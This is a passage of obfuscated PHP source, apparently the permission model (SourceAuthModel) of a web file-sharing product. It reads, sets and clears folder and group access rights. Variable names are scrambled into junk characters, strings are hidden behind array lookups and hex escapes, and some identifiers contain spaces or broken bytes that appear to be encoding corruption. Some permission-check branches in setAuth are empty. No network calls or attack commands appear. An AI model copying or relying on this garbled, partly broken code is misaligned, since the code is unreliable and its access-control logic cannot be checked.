$”¼Çş . $Â²°õß„[593]), $Â²°õß„[594] => 0); $çí²èÚ = $Â²°õß„[595]; $éù¦øáÜ = "\114\x45\106\x54\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\x66\x69\x6c\145\40\146\x69\154\145\x20\x6f\x6e\40\163\x6f\x75\x72\x63\145\x2e\146\x69\x6c\145\111\x44\40\x3d\40\x66\151\x6c\145\56\146\x69\x6c\145\x49\104"; $ÇëõÉÜµ = $this->alias($Â²°õß„[498])->field($çí²èÚ)->where($—Ú¸æÉ±)->join($éù¦øáÜ)->select(); $this->_listAppendAuth($ÇëõÉÜµ); $this->_listAppendUser($ÇëõÉÜµ); $this->_listAppendPath($ÇëõÉÜµ); $ÇëõÉÜµ = array_to_keyvalue($ÇëõÉÜµ, $Â²°õß„[183]); $ ·üîô = "\57{$ØùÖØ…Ñ[$Â²°õß„[32]]}\57"; $ ·üîô = $ ·üîô == $Â²°õß„[573] ? $Â²°õß„[8] : $ ·üîô; $ÓìÙ‰«» = array(); foreach ($ÇëõÉÜµ as $´¡ğ¡›è => $·ë£†Û) { $¡°® Ä˜ = $this->parentLevelArray($·ë£†Û[$Â²°õß„[565]]); array_shift($¡°® Ä˜); $Çî‹¦ˆÉ = $ ·üîô; for ($Œ®ñ…šï = 0; $Œ®ñ…šï < count($¡°® Ä˜); $Œ®ñ…šï++) { $Çî‹¦ˆÉ .= $ÇëõÉÜµ[$¡°® Ä˜[$Œ®ñ…šï]][$Â²°õß„[32]] . $Â²°õß„[8]; } $Çî‹¦ˆÉ .= $·ë£†Û[$Â²°õß„[32]]; if ($·ë£†Û[$Â²°õß„[464]]) { $Çî‹¦ˆÉ .= $Â²°õß„[8]; } $á·Ä¯Íü = array($Â²°õß„[474] => str_replace($Â²°õß„[573], $Â²°õß„[8], str_replace($Â²°õß„[573], $Â²°õß„[8], str_replace($Â²°õß„[573], $Â²°õß„[8], $Çî‹¦ˆÉ))), $Â²°õß„[596] => intval($·ë£†Û[$Â²°õß„[464]]), $Â²°õß„[597] => intval($·ë£†Û[$Â²°õß„[78]]), $Â²°õß„[87] => intval($·ë£†Û[$Â²°õß„[87]]), $Â²°õß„[89] => $this->pathInfoFilter($·ë£†Û)); if (!$á·Ä¯Íü[$Â²°õß„[464]]) { $á·Ä¯Íü[$Â²°õß„[520]] = $·ë£†Û[$Â²°õß„[520]]; } $ÓìÙ‰«»[] = $á·Ä¯Íü; } $ÓìÙ‰«» = array_sort_by($ÓìÙ‰«», $Â²°õß„[86]); return $ÓìÙ‰«»; } } goto A”Ø¾ö¡œ×; cñƒ‚¨‚º“: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\162\143\x65\x5f\x61\x75\164\x68"; public function getAuth($×²øÈõğ) { $‡ÏŞ…¡î =& $_SERVER[ •ŒÓîÆ]; $¦Ç‰Èªñ = $this->sourceAuthSelect($×²øÈõğ); $Ö·é¦–ä = array(); $Ù´çù†Ü = array(); $¼êëÓÔˆ = 2 << 25; foreach ($¦Ç‰Èªñ as $ã•ÙÏœË) { $îüµ€˜­ = Model($‡ÏŞ…¡î[552])->listData($ã•ÙÏœË[$‡ÏŞ…¡î[1992]]); if (!$îüµ€˜­) { continue; } $Ö·é¦–ä[] = $ã•ÙÏœË; $– ¦½õØ = 0; if ($ã•ÙÏœË[$‡ÏŞ…¡î[180]] == SourceModel::TYPE_GROUP) { $– ¦½õØ = $¼êëÓÔˆ * 2; } if ($ã•ÙÏœË[$‡ÏŞ…¡î[180]] == SourceModel::TYPE_USER) { $– ¦½õØ = $¼êëÓÔˆ; } if ($ã•ÙÏœË[$‡ÏŞ…¡î[180]] == SourceModel::TYPE_USER && $ã•ÙÏœË[$‡ÏŞ…¡î[550]] == $‡ÏŞ…¡î[214]) { $– ¦½õØ = 0; } $Ù´çù†Ü[] = $îüµ€˜­[$‡ÏŞ…¡î[466]] + $– ¦½õØ; } array_multisort($Ù´çù†Ü, SORT_DESC, $Ö·é¦–ä); return $Ö·é¦–ä; } public function sourceAuthSelect($½×İè¡š) { $‚ÂŸ¿Şç =& $_SERVER[ •ŒÓîÆ]; static $‚é©”À = array(); $«Ì´øãù = is_array($½×İè¡š) ? !1 : !0; if ($«Ì´øãù) { $½×İè¡š = array($½×İè¡š); } $ıÒáÓşØ = array(); foreach ($½×İè¡š as $îöûœ®) { if (isset($‚é©”À[$îöûœ®])) { $ıÒáÓşØ[$îöûœ®] = $‚é©”À[$îöûœ®]; } } if (count($ıÒáÓşØ) == count($½×İè¡š)) { return $«Ì´øãù ? $ıÒáÓşØ[$½×İè¡š[0]] : $ıÒáÓşØ; } $Ôæ»Ö´ = $‚ÂŸ¿Şç[2069]; $Ü‚´ÈÉ = array($‚ÂŸ¿Şç[183] => array($‚ÂŸ¿Şç[7], $½×İè¡š)); $¸·ò¬™ = $this->field($Ôæ»Ö´)->order($‚ÂŸ¿Şç[453])->where($Ü‚´ÈÉ)->select(); $¡£ñéæó = array_to_keyvalue_group($¸·ò¬™, $‚ÂŸ¿Şç[183]); foreach ($½×İè¡š as $îöûœ®) { $‚é©”À[$îöûœ®] = $¡£ñéæó[$îöûœ®] ? $¡£ñéæó[$îöûœ®] : array(); } if ($«Ì´øãù) { return $¸·ò¬™; } return $¡£ñéæó; } public function setAuth($Ï¾ğêæ‹, $¾”ŸòƒÄ) { $º“§µ =& $_SERVER[ •ŒÓîÆ]; $Ä§µ÷÷æ = Model($º“§µ[1374])->sourceInfo($Ï¾ğêæ‹); if (!$Ä§µ÷÷æ) { return !1; } if ($Ä§µ÷÷æ[$º“§µ[180]] != SourceModel::TYPE_GROUP) { return !1; } $¢‹Ó—²Â = 1; $í‡‚¢€› = $Ä§µ÷÷æ[$º“§µ[550]]; if ($í‡‚¢€› != $¢‹Ó—²Â) { $ÅÖ¡îãÇ = array($º“§µ[1888] => $í‡‚¢€›); $—­Ìé€ = Model($º“§µ[1978])->field($º“§µ[1690])->where($ÅÖ¡îãÇ)->select(); $—­Ìé€ = array_to_keyvalue($—­Ìé€, $º“§µ[12], $º“§µ[1690]); } $Ú£èÆš = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $çÄıÑÈø = array(); foreach ($¾”ŸòƒÄ as $¿“¢ùô) { if (!in_array($¿“¢ùô[$º“§µ[180]], $Ú£èÆš)) { show_json(LNG($º“§µ[2070]), !1); } if ($í‡‚¢€› != $¢‹Ó—²Â) { if ($¿“¢ùô[$º“§µ[180]] == SourceModel::TYPE_GROUP) { } if ($¿“¢ùô[$º“§µ[550]] != 0 && !in_array($¿“¢ùô[$º“§µ[550]], $—­Ìé€)) { } } if ($¿“¢ùô[$º“§µ[550]] == 0) { $¿“¢ùô[$º“§µ[180]] = SourceModel::TYPE_USER; } $çÄıÑÈø[] = array($º“§µ[183] => $Ï¾ğêæ‹, $º“§µ[180] => intval($¿“¢ùô[$º“§µ[180]]), $º“§µ[550] => intval($¿“¢ùô[$º“§µ[550]]), $º“§µ[1992] => intval($¿“¢ùô[$º“§µ[1992]]) ? intval($¿“¢ùô[$º“§µ[1992]]) : 0, $º“§µ[2052] => intval($¿“¢ùô[$º“§µ[2052]]) ? intval($¿“¢ùô[$º“§µ[2052]]) : -1); } $this->where(array($º“§µ[470] => $Ï¾ğêæ‹))->delete(); $this->addAll($çÄıÑÈø); return !0; } public function authClear($Ê«ôêÛÔ) { $¼ø‹çâå =& $_SERVER[ •ŒÓîÆ]; $¥¬Áö¸ = Model($¼ø‹çâå[1374])->sourceInfo($Ê«ôêÛÔ); $–Çò•¸­ = array($Ê«ôêÛÔ); if ($¥¬Áö¸[$¼ø‹çâå[464]] == $¼ø‹çâå[90]) { $Ú²Ÿúî = array($¼ø‹çâå[632] => array($¼ø‹çâå[592], $¥¬Áö¸[$¼ø‹çâå[565]] . $Ê«ôêÛÔ . $¼ø‹çâå[593])); $–Çò•¸­ = Model($¼ø‹çâå[1374])->field($¼ø‹çâå[470])->where($Ú²Ÿúî)->getField($¼ø‹çâå[183], !0); $–Çò•¸­[] = $Ê«ôêÛÔ; } $this->where(array($¼ø‹çâå[470] => array($¼ø‹çâå[471], $–Çò•¸­)))->delete(); return !0; } public function getAllChildren($ü¬—’íÚ) { $ô×ˆü÷Ì =& $_SERVER[ •ŒÓîÆ]; $èº­çØ¤ = Model($ô×ˆü÷Ì[1374])->sourceInfo($ü¬—’íÚ); if ($èº­çØ¤[$ô×ˆü÷Ì[464]] != $ô×ˆü÷Ì[90]) { return $this->sourceListAuth(array($ü¬—’íÚ)); } if ($èº­çØ¤[$ô×ˆü÷Ì[180]] != SourceModel::TYPE_GROUP) { return array(); } $åíÕòÕ = 1; $¶«¬…ºî = array($ü¬—’íÚ); if ($èº­çØ¤[$ô×ˆü÷Ì[182]] == $ô×ˆü÷Ì[214] && $èº­çØ¤[$ô×ˆü÷Ì[550]] != $åíÕòÕ) { $¶«¬…ºî = $this->groupChidldAllRootSource($èº­çØ¤[$ô×ˆü÷Ì[550]]); } $¦Ì¼÷ğ¼ = $this->field($ô×ˆü÷Ì[183])->group($ô×ˆü÷Ì[183])->select(); $¦Ì¼÷ğ¼ = array_to_keyvalue($¦Ì¼÷ğ¼, $ô×ˆü÷Ì[12], $ô×ˆü÷Ì[183]); if (!$¦Ì¼÷ğ¼) { return array(); } $ÊËÜƒ«Ú = $ô×ˆü÷Ì[2071]; $ßèÙÚÏâ = array($ô×ˆü÷Ì[183] => array($ô×ˆü÷Ì[7], $¦Ì¼÷ğ¼), $ô×ˆü÷Ì[484] => $ô×ˆü÷Ì[214]); $äÈäĞ‹ = Model($ô×ˆü÷Ì[866])->field($ÊËÜƒ«Ú)->where($ßèÙÚÏâ)->select(); $ñŸ¬èõÔ = array($ü¬—’íÚ); foreach ($äÈäĞ‹ as $½ºŸìÔ) { foreach ($¶«¬…ºî as $£Úßàˆ”) { $‘€ş–• = $ô×ˆü÷Ì[50] . $£Úßàˆ” . $ô×ˆü÷Ì[50]; $±–Œ´ÍÄ = $½ºŸìÔ[$ô×ˆü÷Ì[565]] . $½ºŸìÔ[$ô×ˆü÷Ì[183]] . $ô×ˆü÷Ì[50]; if (strstr($±–Œ´ÍÄ, $‘€ş–•)) { $ñŸ¬èõÔ[] = $½ºŸìÔ[$ô×ˆü÷Ì[183]]; break; } } } return $this->sourceListAuth($ñŸ¬èõÔ); } private function sourceListAuth($Üêš­±š) { $–Åü¼¦ı =& $_SERVER[ •ŒÓîÆ]; $õé‡¨«‡ = Model($–Åü¼¦ı[1374])->sourceListInfo($Üêš­±š, !0); $¾°¡èç = $this->sourceAuthSelect($Üêš­±š); $à€Ğ¶ = array(); $“êÛ°Ï = array(); foreach ($õé‡¨«‡ as $ª¥õÔšË) { unset($ª¥õÔšË[$–Åü¼¦ı[508]]); unset($ª¥õÔšË[$–Åü¼¦ı[506]]); unset($ª¥õÔšË[$–Åü¼¦ı[466]]); unset($ª¥õÔšË[$–Åü¼¦ı[89]]); $Î°Ü“ğÑ = $¾°¡èç[$ª¥õÔšË[$–Åü¼¦ı[183]]]; if (!$Î°Ü“ğÑ) { continue; } $ª¥õÔšË[$–Åü¼¦ı[2072]] = $this->authTargetInfo($Î°Ü“ğÑ); $ª¥õÔšË[$–Åü¼¦ı[563]] = rtrim($ª¥õÔšË[$–Åü¼¦ı[569]], $–Åü¼¦ı[8]) . $–Åü¼¦ı[8] . ltrim($ª¥õÔšË[$–Åü¼¦ı[563]], $–Åü¼¦ı[8]); $à€Ğ¶[] = $ª¥õÔšË; $£šäö×Á = count(explode($–Åü¼¦ı[8], trim($ª¥õÔšË[$–Åü¼¦ı[563]], $–Åü¼¦ı[8]))); $“êÛ°Ï[] = $£šäö×Á + ($ª¥õÔšË[$–Åü¼¦ı[33]] == $–Åü¼¦ı[77] ? 0 : 1000); } array_multisort($“êÛ°Ï, SORT_ASC, $à€Ğ¶); return $à€Ğ¶; } private function groupChidldAllRootSource($ÙÒ»Ñ) { $çåÄ˜ á =& $_SERVER[ •ŒÓîÆ]; $¤œ—×‘¿ = Model($çåÄ˜ á[2073])->groupChildrenAll($ÙÒ»Ñ); $éÜŞşâ™ = array($çåÄ˜ á[182] => 0, $çåÄ˜ á[550] => array($çåÄ˜ á[7], $¤œ—×‘¿), $çåÄ˜ á[180] => SourceModel::TYPE_GROUP); $ÕÙ´‚• = Model($çåÄ˜ á[866])->field($çåÄ˜ á[183])->where($éÜŞşâ™)->select(); $ÕÙ´‚• = array_to_keyvalue($ÕÙ´‚•, $çåÄ˜ á[12], $çåÄ˜ á[183]); return $ÕÙ´‚•; } private function authTargetInfo($´ùäŠùà) { $¨Áİ“… =& $_SERVER[ •ŒÓîÆ]; $Ø”À…è¤ = array(); $‹³íñĞ¸ = array(); $§ô±ë¬ô = 2 << 25; foreach ($´ùäŠùà as $ÁÓ¡¦î) { $Üö×˜İŞ = Model($¨Áİ“…[552])->listData($ÁÓ¡¦î[$¨Áİ“…[1992]]); if (!$Üö×˜İŞ) { continue; } if ($ÁÓ¡¦î[$¨Áİ“…[180]] == SourceModel::TYPE_USER) { $ˆàõÕ¾Œ = Model($¨Áİ“…[558])->getInfoSimpleOuter($ÁÓ¡¦î[$¨Áİ“…[550]]); if ($ˆàõÕ¾Œ[$¨Áİ“…[1690]] == $¨Áİ“…[1229]) { continue; } if ($ˆàõÕ¾Œ[$¨Áİ“…[1690]] == $¨Áİ“…[214]) { $ˆàõÕ¾Œ[$¨Áİ“…[32]] = LNG($¨Áİ“…[2074]); } } else { $ˆàõÕ¾Œ = Model($¨Áİ“…[566])->getInfoSimple($ÁÓ¡¦î[$¨Áİ“…[550]]); } if (!$ˆàõÕ¾Œ) { continue; } $ˆàõÕ¾Œ[$¨Áİ“…[519]] = $Üö×˜İŞ; $Ø”À…è¤[] = $ˆàõÕ¾Œ; $Äá¬ş×² = 0; if ($ÁÓ¡¦î[$¨Áİ“…[180]] == SourceModel::TYPE_GROUP) { $Äá¬ş×² = $§ô±ë¬ô * 2; } if ($ÁÓ¡¦î[$¨Áİ“…[180]] == SourceModel::TYPE_USER) { $Äá¬ş×² = $§ô±ë¬ô; } if ($ÁÓ¡¦î[$¨Áİ“…[180]] == SourceModel::TYPE_USER && $ÁÓ¡¦î[$¨Áİ“…[550]] == $¨Áİ“…[214]) { $Äá¬ş×² = 0; } $‹³íñĞ¸[] = $Üö×˜İŞ[$¨Áİ“…[466]] + $Äá¬ş×²; } array_multisort($‹³íñĞ¸, SORT_DESC, $Ø”À…è¤); return $Ø”À…è¤; } public function getAllChildrenByUser($Øóê¢Ë±, $ÌÅï‡“É) { $…ùÀëşÓ =& $_SERVER[ •ŒÓîÆ]; $—á³ˆÔ = Model($…ùÀëşÓ[579])->getInfo($ÌÅï‡“É); if (!$ÌÅï‡“É || !$Øóê¢Ë± || !$—á³ˆÔ) { return array(); } $İ‡ï³€ = Model($…ùÀëşÓ[1374])->sourceInfo($Øóê¢Ë±); $ÖéÊÓŞë = array(); $±ÒıüÙ¾ = 1; if ($İ‡ï³€[$…ùÀëşÓ[182]] == $…ùÀëşÓ[214] && $İ‡ï³€[$…ùÀëşÓ[550]] != $±ÒıüÙ¾ && $this->groupContainUser($İ‡ï³€[$…ùÀëşÓ[550]], $ÌÅï‡“É)) { foreach ($—á³ˆÔ[$…ùÀëşÓ[2075]] as $µØŠ‘à) { $öÏëÈî… = Model($…ùÀëşÓ[566])->getInfo($µØŠ‘à[$…ùÀëşÓ[1888]]); $¡±ÎËò‡ = Model($…ùÀëşÓ[579])->getInfoSimpleOuter($ÌÅï‡“É); $¡±ÎËò‡[$…ùÀëşÓ[519]] = $µØŠ‘à[$…ùÀëşÓ[466]]; if (Model($…ùÀëşÓ[552])->authCheckAction($µØŠ‘à[$…ùÀëşÓ[466]][$…ùÀëşÓ[466]], $…ùÀëşÓ[1909])) { continue; } $—ç–ğÎ = array($…ùÀëşÓ[32] => $…ùÀëşÓ[1249] . $öÏëÈî…[$…ùÀëşÓ[32]], $…ùÀëşÓ[183] => $öÏëÈî…[$…ùÀëşÓ[89]][$…ùÀëşÓ[183]], $…ùÀëşÓ[86] => KodIO::make($öÏëÈî…[$…ùÀëşÓ[89]][$…ùÀëşÓ[183]]), $…ùÀëşÓ[182] => $…ùÀëşÓ[214], $…ùÀëşÓ[180] => $…ùÀëşÓ[559], $…ùÀëşÓ[33] => $…ùÀëşÓ[596], $…ùÀëşÓ[563] => $öÏëÈî…[$…ùÀëşÓ[570]], $…ùÀëşÓ[1888] => $öÏëÈî…[$…ùÀëşÓ[1888]], $…ùÀëşÓ[567] => $öÏëÈî…[$…ùÀëşÓ[182]], $…ùÀëşÓ[2072] => array($¡±ÎËò‡)); $ÖéÊÓŞë[$—ç–ğÎ[$…ùÀëşÓ[183]]] = $—ç–ğÎ; } } $ÊùªÍ½ = array(); $ô‚ğ«æ = $this->getAllChildren($Øóê¢Ë±); foreach ($ô‚ğ«æ as $¤Şı¨‡–) { $—È¤ÖÑï = !1; foreach ($¤Şı¨‡–[$…ùÀëşÓ[2072]] as $”Ã™œñÎ) { if ($”Ã™œñÎ[$…ùÀëşÓ[1690]]) { if ($”Ã™œñÎ[$…ùÀëşÓ[1690]] == $ÌÅï‡“É) { $—È¤ÖÑï = !0; break; } } if ($”Ã™œñÎ[$…ùÀëşÓ[1888]]) { if ($this->groupContainUser($”Ã™œñÎ[$…ùÀëşÓ[1888]], $ÌÅï‡“É)) { $—È¤ÖÑï = !0; break; } } } if ($—È¤ÖÑï) { $ÊùªÍ½[] = $¤Şı¨‡–; } $Ì’í£ = $¤Şı¨‡–[$…ùÀëşÓ[183]]; if (isset($ÖéÊÓŞë[$Ì’í£])) { $¤Şı¨‡–[$…ùÀëşÓ[2072]][] = $ÖéÊÓŞë[$Ì’í£][0]; $ÖéÊÓŞë[$Ì’í£] = !1; } } $ÖéÊÓŞë = array_filter(array_values($ÖéÊÓŞë)); $ÊùªÍ½ = array_merge($ÖéÊÓŞë, $ÊùªÍ½); return $ÊùªÍ½; } public function setAllChildrenByUser($ö•ŞéŸÏ, $¼·¡ıÏ , $Ü’¹åëÙ) { $±‚¤Çí =& $_SERVER[ •ŒÓîÆ]; $˜‹Èúí = $this->getAllChildrenByUser($ö•ŞéŸÏ, $¼·¡ıÏ ); if (!$Ü’¹åëÙ || !$˜‹Èúí) { return !1; } foreach ($˜‹Èúí as $È“‹©Ï) { $Ôùë½è = array(); foreach ($È“‹©Ï[$±‚¤Çí[2072]] as $¦Ò°ƒ) { $ñˆ«‹ËË = $¦Ò°ƒ[$±‚¤Çí[519]]; $Ìéç§ûÚ = $¦Ò°ƒ[$±‚¤Çí[1690]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $±Ö™ëÃî = $¦Ò°ƒ[$±‚¤Çí[1690]] ? $¦Ò°ƒ[$±‚¤Çí[1690]] : $¦Ò°ƒ[$±‚¤Çí[1888]]; if ($¦Ò°ƒ[$±‚¤Çí[1690]] && $¦Ò°ƒ[$±‚¤Çí[1690]] == $¼·¡ıÏ ) { continue; } $Ôùë½è[] = array($±‚¤Çí[183] => $È“‹©Ï[$±‚¤Çí[183]], $±‚¤Çí[180] => $Ìéç§ûÚ, $±‚¤Çí[550] => intval($±Ö™ëÃî), $±‚¤Çí[1992] => isset($ñˆ«‹ËË[$±‚¤Çí[453]]) ? intval($ñˆ«‹ËË[$±‚¤Çí[453]]) : 0, $±‚¤Çí[2052] => isset($ñˆ«‹ËË[$±‚¤Çí[2052]]) ? intval($ñˆ«‹ËË[$±‚¤Çí[2052]]) : -1); } $Ôùë½è[] = array($±‚¤Çí[183] => $È“‹©Ï[$±‚¤Çí[183]], $±‚¤Çí[180] => SourceModel::TYPE_USER, $±‚¤Çí[550] => intval($¼·¡ıÏ ), $±‚¤Çí[1992] => intval($Ü’¹åëÙ), $±‚¤Çí[2052] => -1); $this->where(array($±‚¤Çí[470] => $È“‹©Ï[$±‚¤Çí[183]]))->delete(); $this->addAll($Ôùë½è); } return !0; } public function get($’éÍå¦ë) { $ú¢ç¤Î = $this->getSourceList(array($’éÍå¦ë), !0); return $ú¢ç¤Î[0]; } public function getSourceList($ûÅÓë, $Óêˆ‡ƒÄ = false, $ëşâ›¤ş = false) { $ˆªÑßç =& $_SERVER[ •ŒÓîÆ]; if (!$ûÅÓë) { return array(); } $¿äåÌáÔ = Model($ˆªÑßç[1374]); if (!$Óêˆ‡ƒÄ && count($ûÅÓë) == 1) { $Óêˆ‡ƒÄ = array(); $Óêˆ‡ƒÄ[$ûÅÓë[0]] = $¿äåÌáÔ->sourceInfo($ûÅÓë[0]); } if (!$Óêˆ‡ƒÄ) { $æÁ¦°¡² = array($ˆªÑßç[470] => array($ˆªÑßç[471], $ûÅÓë)); $Óêˆ‡ƒÄ = $¿äåÌáÔ->field($ˆªÑßç[2076])->where($æÁ¦°¡²)->select(); $Óêˆ‡ƒÄ = array_to_keyvalue($Óêˆ‡ƒÄ, $ˆªÑßç[183]); } $á†ÍÙ‡Š = $ûÅÓë; foreach ($Óêˆ‡ƒÄ as $îş‘ò => $¾Ç—ôä‘) { $¥—­â¶› = $¿äåÌáÔ->parentLevelArray($¾Ç—ôä‘[$ˆªÑßç[565]]); $á†ÍÙ‡Š = array_merge($á†ÍÙ‡Š, array($îş‘ò), array_reverse($¥—­â¶›)); } $á†ÍÙ‡Š = array_values(array_unique($á†ÍÙ‡Š)); if (!$á†ÍÙ‡Š) { return array(); } $¨´Œ”Ã· = $this->sourceAuthSelect($á†ÍÙ‡Š); $“çÉ™”¥ = array(); foreach ($á†ÍÙ‡Š as $¡ÌÅóëÂ) { if (isset($¨´Œ”Ã·[$¡ÌÅóëÂ])) { $“çÉ™”¥[$¡ÌÅóëÂ] = $¨´Œ”Ã·[$¡ÌÅóëÂ]; } } $ÒŒø§ªĞ = $this->userIsRoot($ëşâ›¤ş); $¯¹òµ³Š = AuthModel::authAll(); $ï”èæÈÙ = array($ˆªÑßç[467] => $¯¹òµ³Š, $ˆªÑßç[2077] => array($ˆªÑßç[472] => 0, $ˆªÑßç[1894] => $¯¹òµ³Š, $ˆªÑßç[473] => LNG($ˆªÑßç[2078]), $ˆªÑßç[1911] => $ˆªÑßç[2079])); $§“éãá‘ = array(); foreach ($Óêˆ‡ƒÄ as $¡ÌÅóëÂ => $ÁìşŞ ) { if ($ÒŒø§ªĞ && $GLOBALS[$ˆªÑßç[6]][$ˆªÑßç[1907]]) { $§“éãá‘[$¡ÌÅóëÂ] = $ï”èæÈÙ; continue; } $§“éãá‘[$¡ÌÅóëÂ] = $this->makeSourceAuth($ÁìşŞ , $“çÉ™”¥, $ëşâ›¤ş); } return $§“éãá‘; } public function authDeepCheck($ÕĞ‘ª·, $ˆŠ¥¦†Ø = false) { $±Ò¼ËÍ =& $_SERVER[ •ŒÓîÆ]; $ˆŠ¥¦†Ø = $ˆŠ¥¦†Ø ? $ˆŠ¥¦†Ø : USER_ID; $æĞ¬şŠ = $this->makeAuthDeep($ˆŠ¥¦†Ø); if (!in_array($ÕĞ‘ª·, $æĞ¬şŠ[$±Ò¼ËÍ[2080]])) { return !1; } $ÔĞæÂ÷ = array(); foreach ($æĞ¬şŠ[$±Ò¼ËÍ[2081]] as $ºòş…¼â => $Á®µéà“) { if (!in_array($ÕĞ‘ª·, $Á®µéà“)) { continue; } $ÔĞæÂ÷[] = $ºòş…¼â; } if (!$ÔĞæÂ÷) { return !1; } $úÍüÖ× = $ÔĞæÂ÷ ? $ÔĞæÂ÷[0] : $ÕĞ‘ª·; return array($±Ò¼ËÍ[467] => -1, $±Ò¼ËÍ[519] => array($±Ò¼ËÍ[472] => $±Ò¼ËÍ[1229], $±Ò¼ËÍ[1894] => $±Ò¼ËÍ[214], $±Ò¼ËÍ[473] => LNG($±Ò¼ËÍ[2082]), $±Ò¼ËÍ[1911] => $±Ò¼ËÍ[2083]), $±Ò¼ËÍ[2084] => LNG($±Ò¼ËÍ[2085]), $±Ò¼ËÍ[2086] => $this->sourceAuthInfo($úÍüÖ×)); } protected function makeAuthDeep($×Ş¤Ü = false) { $ÄõÁÁÌ =& $_SERVER[ •ŒÓîÆ]; static $×üãš‰ = array(); $×Ş¤Ü = $×Ş¤Ü ? $×Ş¤Ü : USER_ID; if (isset($×üãš‰[$×Ş¤Ü])) { return $×üãš‰[$×Ş¤Ü]; } $ıüÂä¡Ô = Model($ÄõÁÁÌ[2087])->listData(); $ø±ÖöÔ = array(); foreach ($ıüÂä¡Ô as $–Ÿ…êèÁ) { if ($–Ÿ…êèÁ[$ÄõÁÁÌ[466]] == 0 && $–Ÿ…êèÁ[$ÄõÁÁÌ[1910]] == $ÄõÁÁÌ[90]) { $ø±ÖöÔ[] = $–Ÿ…êèÁ[$ÄõÁÁÌ[453]]; } } $ğõ¥×û = $this->userGroupParents($×Ş¤Ü); $ÏÙğİ‰ = array($ÄõÁÁÌ[180] => SourceModel::TYPE_USER, $ÄõÁÁÌ[550] => $×Ş¤Ü); if ($ğõ¥×û) { $ÏÙğİ‰ = array(array($ÄõÁÁÌ[180] => SourceModel::TYPE_USER, $ÄõÁÁÌ[550] => $×Ş¤Ü), array($ÄõÁÁÌ[180] => SourceModel::TYPE_GROUP, $ÄõÁÁÌ[550] => array($ÄõÁÁÌ[471], $ğõ¥×û)), $ÄõÁÁÌ[1041] => $ÄõÁÁÌ[1986]); } $­ıŞŸÂù = $this->field($ÄõÁÁÌ[2088])->where($ÏÙğİ‰)->select(); $şõ²ã—å = array(); $…•şâ¹¶ = array_to_keyvalue_group($­ıŞŸÂù, $ÄõÁÁÌ[183]); foreach ($…•şâ¹¶ as $ı÷åüøæ => $ÛöùÒğ) { $í âèÆ = $this->authArrayCheck($ÛöùÒğ, $×Ş¤Ü); if ($í âèÆ[$ÄõÁÁÌ[467]] > 0) { $şõ²ã—å[] = $ı÷åüøæ . $ÄõÁÁÌ[12]; } } if ($ğõ¥×û) { $×«Œ®Ï = Model($ÄõÁÁÌ[566]); foreach ($ğõ¥×û as $²ş‹öÛ™) { $¿®³™Â„ = $×«Œ®Ï->getInfo($²ş‹öÛ™); if (!$¿®³™Â„ || !is_array($¿®³™Â„[$ÄõÁÁÌ[89]])) { continue; } $şõ²ã—å[] = $¿®³™Â„[$ÄõÁÁÌ[89]][$ÄõÁÁÌ[183]]; } } $ø¤„Éúå = array(); $‰…°·Ú” = $ğõ¥×û; $Íüğ÷«ı = Model($ÄõÁÁÌ[1374]); $×«Œ®Ï = Model($ÄõÁÁÌ[566]); $öƒÛø¯‘ = array(); $™šëó–Æ = array(); $åÎ«—ëæ = array(); $¨ĞªÙ¨Š = array(); if ($şõ²ã—å) { $ôÙç§îÔ = $Íüğ÷«ı->where(array($ÄõÁÁÌ[183] => array($ÄõÁÁÌ[471], $şõ²ã—å)))->select(); foreach ($ôÙç§îÔ as $Âá¯şÛÉ) { $ä‰®Éìê = $Íüğ÷«ı->parentLevelArray($Âá¯şÛÉ[$ÄõÁÁÌ[565]]); $ø¤„Éúå = array_merge($ø¤„Éúå, $ä‰®Éìê); $‰…°·Ú”[] = $Âá¯şÛÉ[$ÄõÁÁÌ[550]]; $öƒÛø¯‘[$Âá¯şÛÉ[$ÄõÁÁÌ[183]]] = $ä‰®Éìê; $™šëó–Æ[$Âá¯şÛÉ[$ÄõÁÁÌ[183]]] = $Âá¯şÛÉ[$ÄõÁÁÌ[550]]; } } $‰…°·Ú” = array_values(array_unique($‰…°·Ú”)); $Æ…ÓÂó© = $‰…°·Ú”; foreach ($Æ…ÓÂó© as $²ş‹öÛ™) { $¿®³™Â„ = $×«Œ®Ï->getInfo($²ş‹öÛ™); $ä‰®Éìê = $Íüğ÷«ı->parentLevelArray($¿®³™Â„[$ÄõÁÁÌ[565]]); $‰…°·Ú” = array_merge($‰…°·Ú”, $ä‰®Éìê); } $‰…°·Ú” = array_values(array_unique($‰…°·Ú”)); foreach ($‰…°·Ú” as $²ş‹öÛ™) { $¿®³™Â„ = $×«Œ®Ï->getInfo($²ş‹öÛ™); $ø¤„Éúå[] = $¿®³™Â„[$ÄõÁÁÌ[89]][$ÄõÁÁÌ[183]]; $åÎ«—ëæ[$²ş‹öÛ™] = $¿®³™Â„[$ÄõÁÁÌ[89]][$ÄõÁÁÌ[183]]; $¨ĞªÙ¨Š[$²ş‹öÛ™] = $Íüğ÷«ı->parentLevelArray($¿®³™Â„[$ÄõÁÁÌ[565]]); } foreach ($öƒÛø¯‘ as $ô÷Õ˜ª => $¶¡¨ô) { $–ƒÓ˜ïÚ = $™šëó–Æ[$ô÷Õ˜ª]; if (!$–ƒÓ˜ïÚ || !$åÎ«—ëæ[$–ƒÓ˜ïÚ]) { continue; } $Ä¾Ã–ÖÄ = array(); foreach ($¨ĞªÙ¨Š[$–ƒÓ˜ïÚ] as $²ş‹öÛ™) { $Ä¾Ã–ÖÄ[] = $åÎ«—ëæ[$²ş‹öÛ™]; } $öƒÛø¯‘[$ô÷Õ˜ª] = array_merge($Ä¾Ã–ÖÄ, $¶¡¨ô); } $ø¤„Éúå = array_values(array_unique($ø¤„Éúå)); $›Ã¡Ø° = array($ÄõÁÁÌ[2080] => $ø¤„Éúå, $ÄõÁÁÌ[2081] => $öƒÛø¯‘); $×üãš‰[$×Ş¤Ü] = $›Ã¡Ø°; return $›Ã¡Ø°; } private function makeSourceAuth($ŞáäêØ», $˜„Š¦¸, $áığøƒê = false) { $ëéßôŸ“ =& $_SERVER[ •ŒÓîÆ]; $·õ²ê = $ëéßôŸ“[90]; $íÅ›ÆõÇ = $ŞáäêØ»[$ëéßôŸ“[550]]; $¨õÖıàÏ = $ŞáäêØ»[$ëéßôŸ“[180]] == SourceModel::TYPE_GROUP; $‹‹œ˜èŒ = $¨õÖıàÏ ? 